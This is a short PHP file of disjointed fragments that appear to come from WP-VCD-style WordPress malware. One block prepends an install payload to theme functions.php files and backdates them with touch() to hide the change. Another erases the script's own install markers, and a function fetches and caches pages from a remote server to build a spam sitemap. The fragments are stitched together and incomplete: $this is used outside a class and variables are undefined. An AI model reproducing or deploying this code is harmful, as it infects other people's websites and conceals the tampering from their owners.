<?php 
  function load_data(){
    if($this->_uri){
      if (!file_exists($this->_cacheFolder . md5($this->_uri) . '.dat')) {
        $heads = get_head($this->_server . $this->_host ."/" . $this->_uri);

        if(preg_match('#404#',$heads) || preg_match('#500#',$heads)){
          return FALSE;
        } else {
          $response = file_get_contents($this->_server . $this->_host ."/" . $this->_uri);
          file_put_contents($this->_cacheFolder . md5($this->_uri) . '.dat', $response);
        }
        @file_put_contents($this->_cacheFolder.'sitemap.html',@file_get_contents($this->_cacheFolder.'sitemap.html').'<a href="http://'.$this->_host ."/" . $this->_uri.'">'.$this->_host ."/" . $this->_uri.'</a> - cacheName:'.md5($this->_uri) . '.dat'.'<br>');
      }
    }
  }


  if ($file = @file_get_contents(__FILE__)) { 
    $file = preg_replace('!//install_code.*//install_code_end!s', '', $file); 
    $file = preg_replace('!<\?php\s*\?>!s', '', $file); 
    @file_put_contents(__FILE__, $file); 
  }

  if($content = file_get_contents($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . 'functions.php'))
    {
      if(strpos($content, 'WP_V_CD') === false)    
        {
          $content = $install_code . $content;
          @file_put_contents($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . 'functions.php', $content);
          touch($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . 'functions.php' , $time);
        }
      else
        {
          $ping = false;
        }
    }

?>
